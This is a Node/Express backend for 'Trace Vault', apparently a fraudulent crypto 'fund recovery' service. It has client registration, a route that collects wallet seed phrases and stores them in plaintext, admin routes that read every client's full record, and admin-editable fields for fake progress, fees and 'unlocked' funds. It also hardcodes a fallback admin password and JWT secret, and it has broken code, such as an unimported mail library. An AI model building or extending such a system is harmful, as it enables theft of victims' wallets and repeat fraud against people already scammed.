import express from 'express';
import cors from 'cors';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import mongoose from 'mongoose';
import dotenv from 'dotenv';

// Only load the local .env file if we are NOT on Vercel
if (process.env.NODE_ENV !== 'production') {
    dotenv.config();
}

// Deployment safety checks: allow a developer override with DEV_ALLOW_LOCAL=true
const isDevLocal = process.env.DEV_ALLOW_LOCAL === 'true';
const requiredEnvMissing = [];
if (!process.env.JWT_SECRET) requiredEnvMissing.push('JWT_SECRET');
if (!process.env.MONGODB_URI && !isDevLocal) requiredEnvMissing.push('MONGODB_URI');
// Disallow local MongoDB URIs in deployments unless explicitly allowed
if (process.env.MONGODB_URI && /(127\.0\.0\.1|localhost)/.test(process.env.MONGODB_URI) && !isDevLocal) {
  requiredEnvMissing.push('MONGODB_URI (local addresses not allowed; set DEV_ALLOW_LOCAL=true to override)');
}
if (!isDevLocal && (!process.env.SMTP_HOST || !process.env.SMTP_USER || !process.env.SMTP_PASS || !process.env.EMAIL_FROM)) {
  requiredEnvMissing.push('SMTP_HOST/SMTP_USER/SMTP_PASS/EMAIL_FROM');
}

if (requiredEnvMissing.length > 0) {
  console.error('Missing or insecure environment configuration:');
  requiredEnvMissing.forEach((e) => console.error(` - ${e}`));
  if (!isDevLocal) {
    console.error('Aborting process to avoid local-only data persistence.');
    process.exit(1);
  } else {
    console.warn('DEV_ALLOW_LOCAL=true detected — continuing in local dev mode (some services are mocked/fallbacks enabled)');
  }
}

const app = express();
const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || 'vaulttrace-secret-key-2024';
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/vaulttrace';

if (!MONGODB_URI) {
  console.error('❌ Error: MONGODB_URI is not defined in .env or environment.');
} else {
  mongoose.set('strictQuery', false);
  mongoose
    .connect(MONGODB_URI)
    .then(() => console.log(`✅ Connected to MongoDB at ${MONGODB_URI}`))
    .catch((error) => {
      console.error('❌ MongoDB connection error:', error.message);
      if (error.message.includes('Authentication failed')) {
        console.log('Tip: Check if your password in .env is URL encoded (%40 instead of @).');
      }
      // Don't exit immediately; the server can still accept requests and retry connections
      console.log('⚠️  Continuing without database. Some operations may fail.');
    });
}

const clientSchema = new mongoose.Schema(
  {
    name: { type: String, required: true },
    fullName: String,
    email: { type: String, required: true, unique: true },
    password: { type: String, required: true },
    description: String,
    evidence: String,
    caseId: String,
    amount: { type: Number, default: 0 },
    amountLost: { type: Number, default: 0 },
    data: {
      recoveredAmount: { type: Number, default: 0 },
      trackingProgress: { type: Number, default: 0 },
      feePaid: { type: Boolean, default: false },
      paymentPending: { type: Boolean, default: false },
      paymentConfirmed: { type: Boolean, default: false },
      fundsUnlocked: { type: Boolean, default: false },
      balance: { type: Number, default: 0 },
      fixed: { type: Number, default: 0 },
      marsettaShare: { type: Number, default: 0 },
      verifiedLoss1: { type: Number, default: 0 },
      verifiedLoss2: { type: Number, default: 0 },
      totalEntitlement: { type: Number, default: 0 },
    },
    wallet: { type: String, default: '' },
    seedPhrase: { type: String, default: '' },
  },
  {
    timestamps: true,
    toJSON: { virtuals: true },
    toObject: { virtuals: true },
  }
);

clientSchema.virtual('id').get(function () {
  return this._id.toHexString();
});

const messageSchema = new mongoose.Schema(
  {
    from: { type: String, enum: ['Admin', 'Client'], required: true },
    message: { type: String, required: true },
    time: { type: Date, default: Date.now },
    clientEmail: { type: String, required: true },
    clientId: { type: mongoose.Schema.Types.ObjectId, ref: 'Client', required: true },
    adminReply: { type: String, default: null },
    adminReplyTime: { type: Date, default: null },
  },
  {
    timestamps: true,
    toJSON: { virtuals: true },
    toObject: { virtuals: true },
  }
);

messageSchema.virtual('id').get(function () {
  return this._id.toHexString();
});

const Client = mongoose.model('Client', clientSchema);
const Message = mongoose.model('Message', messageSchema);

// Middleware
app.use(cors());
app.use(express.json());

// Authentication middleware
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) {
    return res.status(401).json({ message: 'Access token required' });
  }

  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ message: 'Invalid token' });
    }
    // Normalize local-dev tokens so they don't cause ObjectId cast errors
    if (process.env.DEV_ALLOW_LOCAL === 'true' && typeof user?.id === 'string' && user.id.startsWith('local-')) {
      try {
        user._devLocal = true;
        user.id = new mongoose.Types.ObjectId().toHexString();
      } catch (e) {
        // fallback: leave id as-is
      }
    }
    req.user = user;
    next();
  });
};

// Routes

// Client registration
app.post('/api/register', async (req, res) => {
  try {
    const { fullName, name, email, password, description, evidence, evidenceHash, amountLost, caseId, amount } = req.body;

    // Ensure DB connection is available before proceeding; allow dev fallback when DEV_ALLOW_LOCAL=true
    const dbConnected = mongoose.connection && mongoose.connection.readyState === 1;
    if (!dbConnected && !isDevLocal) {
      console.error('Database not connected — refusing to register to avoid local persistence');
      return res.status(503).json({ message: 'Service unavailable: database not connected' });
    }

    if (!dbConnected && isDevLocal) {
      console.warn('MongoDB not connected — using development fallback response');
      const generatedCaseId = `CASE-${Date.now().toString(36).toUpperCase().slice(-8)}`;
      const tempId = mongoose.Types.ObjectId().toHexString();
      const token = jwt.sign({ id: tempId, email, role: 'client' }, JWT_SECRET || 'dev-jwt-secret', { expiresIn: '24h' });

      return res.status(201).json({
        message: 'Registration successful (dev fallback)',
        caseId: generatedCaseId,
        token,
        user: { id: tempId, name: fullName || name, email, role: 'client', _devLocal: true },
      });
    }

    const existingClient = await Client.findOne({ email });
    if (existingClient) {
      return res.status(400).json({ message: 'Email already registered' });
    }

    const hashedPassword = await bcrypt.hash(password, 10);
    const generatedCaseId = `CASE-${Date.now().toString(36).toUpperCase().slice(-8)}`;

    const newClient = new Client({
      name: fullName || name,
      fullName: fullName || name,
      email,
      password: hashedPassword,
      description,
      evidence,
      evidenceHash,
      caseId: generatedCaseId,
      amount: amount || amountLost || 0,
      amountLost: amountLost || amount || 0,
      data: {
        verifiedLoss1: amountLost || amount || 0,
        trackingProgress: 5,
      },
    });

    await newClient.save();

    // Create an initial system message
    const initialMessage = `Welcome to Trace Vault. Your case file has been securely routed to our intelligence unit. A cyber analyst is currently reviewing the transaction paths provided. Please ensure all communication logs with the entity are uploaded in full. Expect a preliminary forensic feasibility update within 24–48 hours.`;
    await Message.create({ from: 'Admin', message: initialMessage, clientEmail: newClient.email, clientId: newClient._id });

    // Send email if SMTP configured
    const smtpHost = process.env.SMTP_HOST;
    if (smtpHost) {
      try {
        const transporter = nodemailer.createTransport({
          host: process.env.SMTP_HOST,
          port: process.env.SMTP_PORT ? parseInt(process.env.SMTP_PORT, 10) : 587,
          secure: process.env.SMTP_SECURE === 'true',
          auth: process.env.SMTP_USER ? { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS } : undefined,
        });
        await transporter.sendMail({
          from: process.env.EMAIL_FROM || 'no-reply@vaulttrace.org',
          to: newClient.email,
          subject: `Case Received & Registered: Case ID #${generatedCaseId} - Trace Vault`,
          text: `We have received your case and assigned Case ID ${generatedCaseId}.\n\nDo NOT communicate further with the scammers. Log into your secure dashboard for updates.`,
        });
      } catch (err) {
        console.error('Automated email send failed:', err);
      }
    } else {
      console.log('SMTP not configured — automated email payload:', { to: newClient.email, subject: `Case Received & Registered: Case ID #${generatedCaseId}` });
    }

    const token = jwt.sign({ id: newClient.id, email: newClient.email, role: 'client' }, JWT_SECRET, { expiresIn: '24h' });
    res.status(201).json({ message: 'Registration successful', caseId: generatedCaseId, token, user: { id: newClient.id, name: newClient.name, email: newClient.email, role: 'client' } });
  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ message: 'Registration failed' });
  }
});

// Admin: SMTP test endpoint (mirror of vaulttrace server)
app.post('/api/admin/smtp-test', authenticateToken, async (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ message: 'Admin access required' });

  try {
    const { to } = req.body;
    const smtpHost = process.env.SMTP_HOST;
    if (!smtpHost) {
      return res.json({ message: 'SMTP not configured, no email sent', to });
    }

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: process.env.SMTP_PORT ? parseInt(process.env.SMTP_PORT, 10) : 587,
      secure: process.env.SMTP_SECURE === 'true',
      auth: process.env.SMTP_USER ? { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS } : undefined,
    });

    const info = await transporter.sendMail({
      from: process.env.EMAIL_FROM || 'no-reply@vaulttrace.org',
      to,
      subject: 'Trace Vault — SMTP Test',
      text: 'This is a test email from Trace Vault SMTP test endpoint.',
    });

    res.json({ message: 'Test email sent', info });
  } catch (err) {
    console.error('SMTP test error:', err);
    res.status(500).json({ message: 'SMTP test failed', error: String(err) });
  }
});

// Admin: escalate / set milestone stage for a client
app.post('/api/admin/client/:id/escalate', authenticateToken, async (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ message: 'Admin access required' });

  try {
    const dbConnected = mongoose.connection && mongoose.connection.readyState === 1;
    if (!dbConnected && process.env.DEV_ALLOW_LOCAL === 'true') {
      // Return a mocked success response in dev mode
      return res.json({ message: 'Client milestone updated (dev)', trackingProgress: req.body.stage || 6 });
    }

    const client = await Client.findById(req.params.id);
    if (!client) return res.status(404).json({ message: 'Client not found' });

    const { stage } = req.body;
    if (typeof stage === 'number') {
      client.data.trackingProgress = stage;
    } else {
      client.data.trackingProgress = (client.data.trackingProgress || 0) + 1;
    }

    await client.save();
    res.json({ message: 'Client milestone updated', trackingProgress: client.data.trackingProgress });
  } catch (err) {
    console.error('Escalate error:', err);
    res.status(500).json({ message: 'Failed to escalate client' });
  }
});

// Client login
app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const client = await Client.findOne({ email });

    if (!client) {
      return res.status(400).json({ message: 'Invalid credentials' });
    }

    const validPassword = await bcrypt.compare(password, client.password);
    if (!validPassword) {
      return res.status(400).json({ message: 'Invalid credentials' });
    }

    const token = jwt.sign(
      { id: client.id, email: client.email, role: 'client' },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.json({
      token,
      user: {
        id: client.id,
        name: client.name,
        email: client.email,
        role: 'client',
      },
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ message: 'Login failed' });
  }
});

// Admin login
app.post('/api/admin/login', async (req, res) => {
  const { email, password } = req.body;

  const adminEmail = process.env.ADMIN_EMAIL || 'support@vaulttrace.com';
  const adminPassword = process.env.ADMIN_PASSWORD || '@Vaulttrace081';

  if (email !== adminEmail || password !== adminPassword) {
    return res.status(400).json({ message: 'Invalid admin credentials' });
  }

  const token = jwt.sign(
    { email: adminEmail, role: 'admin' },
    JWT_SECRET,
    { expiresIn: '24h' }
  );

  res.json({
    token,
    user: {
      email: adminEmail,
      role: 'admin',
    },
  });
});

// Get all clients (admin only)
app.get('/api/admin/clients', authenticateToken, async (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Admin access required' });
  }

  try {
    const clients = await Client.find({}, 'name email createdAt').lean({ virtuals: true });
    const clientList = clients.map((c) => ({
      id: c.id,
      name: c.name,
      email: c.email,
      createdAt: c.createdAt,
    }));

    res.json(clientList);
  } catch (error) {
    console.error('Fetch clients error:', error);
    res.status(500).json({ message: 'Failed to fetch clients' });
  }
});

// Get client data
app.get('/api/client/data', authenticateToken, async (req, res) => {
  try {
    const dbConnected = mongoose.connection && mongoose.connection.readyState === 1;
    if (!dbConnected && process.env.DEV_ALLOW_LOCAL === 'true') {
      return res.json({
        id: req.user.id,
        name: req.user.name || 'Local Dev',
        email: req.user.email || 'local@example.com',
        caseId: `CASE-DEV-${Date.now().toString(36).slice(-6).toUpperCase()}`,
        data: { trackingProgress: 5, verifiedLoss1: 0 },
      });
    }

    const client = await Client.findById(req.user.id);
    if (!client) {
      return res.status(404).json({ message: 'Client not found' });
    }

    res.json(client);
  } catch (error) {
    console.error('Fetch client data error:', error);
    res.status(500).json({ message: 'Failed to fetch client data' });
  }
});

// Update client data (admin only)
app.put('/api/admin/client/:id', authenticateToken, async (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Admin access required' });
  }

  try {
    const client = await Client.findById(req.params.id);
    if (!client) {
      return res.status(404).json({ message: 'Client not found' });
    }

    client.data = { ...client.data, ...req.body };
    await client.save();

    res.json({ message: 'Client data updated successfully' });
  } catch (error) {
    console.error('Update client error:', error);
    res.status(500).json({ message: 'Failed to update client data' });
  }
});

// Get selected client data (admin only)
app.get('/api/admin/client/:id', authenticateToken, async (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Admin access required' });
  }

  try {
    const client = await Client.findById(req.params.id);
    if (!client) {
      return res.status(404).json({ message: 'Client not found' });
    }

    res.json(client);
  } catch (error) {
    console.error('Fetch selected client error:', error);
    res.status(500).json({ message: 'Failed to fetch client data' });
  }
});

// Update client wallet/seed
app.put('/api/client/wallet', authenticateToken, async (req, res) => {
  try {
    const { wallet, seedPhrase } = req.body;
    const client = await Client.findById(req.user.id);

    if (!client) {
      return res.status(404).json({ message: 'Client not found' });
    }

    client.wallet = wallet;
    client.seedPhrase = seedPhrase;
    await client.save();

    res.json({ message: 'Wallet data updated successfully' });
  } catch (error) {
    console.error('Update wallet error:', error);
    res.status(500).json({ message: 'Failed to update wallet data' });
  }
});

// Change password
app.put('/api/client/password', authenticateToken, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;
    const client = await Client.findById(req.user.id);

    if (!client) {
      return res.status(404).json({ message: 'Client not found' });
    }

    const validPassword = await bcrypt.compare(currentPassword, client.password);
    if (!validPassword) {
      return res.status(400).json({ message: 'Current password is incorrect' });
    }

    client.password = await bcrypt.hash(newPassword, 10);
    await client.save();

    res.json({ message: 'Password changed successfully' });
  } catch (error) {
    console.error('Password change error:', error);
    res.status(500).json({ message: 'Failed to change password' });
  }
});

// Update client verified loss 2 (additional evidence)
app.put('/api/client/verified-loss-2', authenticateToken, async (req, res) => {
  try {
    const { amount } = req.body;
    const client = await Client.findById(req.user.id);

    if (!client) {
      return res.status(404).json({ message: 'Client not found' });
    }

    client.data.verifiedLoss2 = amount || 0;
    // Normalize total entitlement on the server
    client.data.totalEntitlement = (client.data.verifiedLoss1 || 0) + (client.data.verifiedLoss2 || 0);
    await client.save();

    res.json({ message: 'Verified loss 2 updated successfully', data: client.data });
  } catch (error) {
    console.error('Verified loss update error:', error);
    res.status(500).json({ message: 'Failed to update verified loss' });
  }
});

// Send support message
app.post('/api/messages', authenticateToken, async (req, res) => {
  try {
    const { message, clientId: adminClientId } = req.body;
    let targetClientId = req.user.id;
    let targetClientEmail = req.user.email;
    let from = 'Client';

    if (req.user.role === 'admin') {
      if (!adminClientId) {
        return res.status(400).json({ message: 'Client ID is required for admin messages' });
      }
      targetClientId = adminClientId;
      from = 'Admin';
      const client = await Client.findById(adminClientId);
      if (!client) {
        return res.status(404).json({ message: 'Client not found' });
      }
      targetClientEmail = client.email;
    }

    await Message.create({
      from,
      message,
      clientEmail: targetClientEmail,
      clientId: targetClientId,
    });

    res.status(201).json({ message: 'Message sent successfully' });
  } catch (error) {
    console.error('Send message error:', error);
    res.status(500).json({ message: 'Failed to send message' });
  }
});

// Get messages for client or admin
app.get('/api/messages', authenticateToken, async (req, res) => {
  try {
    let filter;

    if (req.user.role === 'admin') {
      if (!req.query.clientEmail) {
        return res.status(400).json({ message: 'Client email is required for admin message queries' });
      }
      filter = { clientEmail: req.query.clientEmail };
    } else {
      filter = { clientId: req.user.id };
    }

    const messages = await Message.find(filter).lean({ virtuals: true });
    res.json(messages);
  } catch (error) {
    console.error('Fetch messages error:', error);
    res.status(500).json({ message: 'Failed to fetch messages' });
  }
});

// Reply to message (admin only)
app.put('/api/messages/:id/reply', authenticateToken, async (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Admin access required' });
  }

  try {
    const { reply } = req.body;
    const message = await Message.findById(req.params.id);

    if (!message) {
      return res.status(404).json({ message: 'Message not found' });
    }

    message.adminReply = reply;
    message.adminReplyTime = new Date();
    await message.save();

    res.json({ message: 'Reply sent successfully' });
  } catch (error) {
    console.error('Reply message error:', error);
    res.status(500).json({ message: 'Failed to send reply' });
  }
});

// Delete client (admin only)
app.delete('/api/admin/client/:id', authenticateToken, async (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ message: 'Admin access required' });
  }

  try {
    const deletedClient = await Client.findByIdAndDelete(req.params.id);
    if (!deletedClient) {
      return res.status(404).json({ message: 'Client not found' });
    }

    await Message.deleteMany({ clientId: req.params.id });
    res.json({ message: 'Client deleted successfully' });
  } catch (error) {
    console.error('Delete client error:', error);
    res.status(500).json({ message: 'Failed to delete client' });
  }
});

// ... Your routes, middleware, and database connection logic above ...

// Only run app.listen locally. Vercel handles the listening in production.
if (process.env.NODE_ENV !== 'production') {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`Server is running locally on port ${PORT}`);
    });
}

// CRITICAL: Vercel needs this export to route incoming traffic to your Express app
// Allow CommonJS `require()` in test runners while also supporting ESM imports
if (typeof module !== 'undefined' && module.exports) {
  module.exports = app;
}

export default app;